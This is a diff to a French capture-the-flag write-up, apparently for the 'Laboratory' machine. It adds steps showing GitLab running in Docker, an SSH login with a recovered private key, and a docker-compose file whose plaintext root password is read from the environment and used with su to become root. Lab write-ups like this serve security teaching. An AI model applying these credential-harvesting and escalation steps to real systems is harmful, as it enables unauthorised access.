@@ -290,6 +290,26 @@ deploying payload - 500
 delete user ILMgLy6G55 - 200
 ```
 
+On confirme que le Gitlab tourne dans un container Docker : 
+
+```bash
+git@gitlab:/$ cat /proc/self/cgroup 
+13:rdma:/
+12:pids:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+11:hugetlb:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+10:net_prio:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+9:perf_event:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+8:net_cls:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+7:freezer:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+6:devices:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+5:memory:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+4:blkio:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+3:cpuacct:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+2:cpu:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+1:cpuset:/docker/7da00bd74e4f73c8caf99406e163083a6489c90451dd09883390a551fd2696cb
+0::/
+```
+
 ### Devenir administrateur du gitlab
 
 Maintenant que nous avons accès à la console gitlab nous pouvons donner les droits d'administrateur à notre user gitlab [gitlab console CheatSheet](https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html)
@@ -350,9 +370,9 @@ Dans le projet de Dexter on trouve une clef privée :
 
 On peut ainsi se connecter en tant que `Dexter`sur la box en utilisant la clef SSH : 
 
-
-
-
+```bash
+{17:02}/netsec/Laboratoire/Laboratory:master ✗ ➭ ssh -i id_rsa dexter@192.168.1.19
+```
 
 ## Container Lateral Escapce
 
@@ -377,9 +397,51 @@ networks:
   dps:
     external: true
 
+
+
+dexter@Lab:/opt$ cat gitlab/docker-compose.yml
+version: '3'
+services:
+  web:
+    image: 'gitlab/gitlab-ce:12.8.1-ce.0'
+    container_name: 'gitlab'
+    restart: always
+    hostname: 'gitlab.laboratory.ctf'
+    #pid: 'host'
+    environment:
+      GITLAB_ROOT_PASSWORD: 'D3x!sTh€B3st'
+     #GITLAB_OMNIBUS_CONFIG: |
+              #external_url 'https://gitlab.laboratory.com'
+              #letsencypt['enable] = false
+        #  ports:
+        #    - '80:80'
+        #    - '443:443'
+    volumes:
+      - './config:/etc/gitlab'
+      - './logs:/var/log/gitlab'
+      - './data:/var/opt/gitlab'
+      - './gitlab.crt:/etc/gitlab/ssl/gitlab.laboratory.ctf.crt:'
+      - './gitlab.key:/etc/gitlab/ssl/gitlab.laboratory.ctf.key:'
+    cap_add:
+     - cap_sys_ptrace
+    networks:
+     - dps
+networks:
+  dps:
+    external: true
+
 ```
 
+On voit des creds pour `root` dans le gitlab : 
 
+```bash 
+git@gitlab:/$ env | grep -i "root"
+GITLAB_ROOT_PASSWORD: 'D3x!sTh€B3st'
+git@gitlab:/$ su - 
+Password:
+root@gitlab:/" 
+
+```
 
 On peut aussi voir dans le docker-compose du container `dps` la commande lancée lors du démarrage du container : 
 
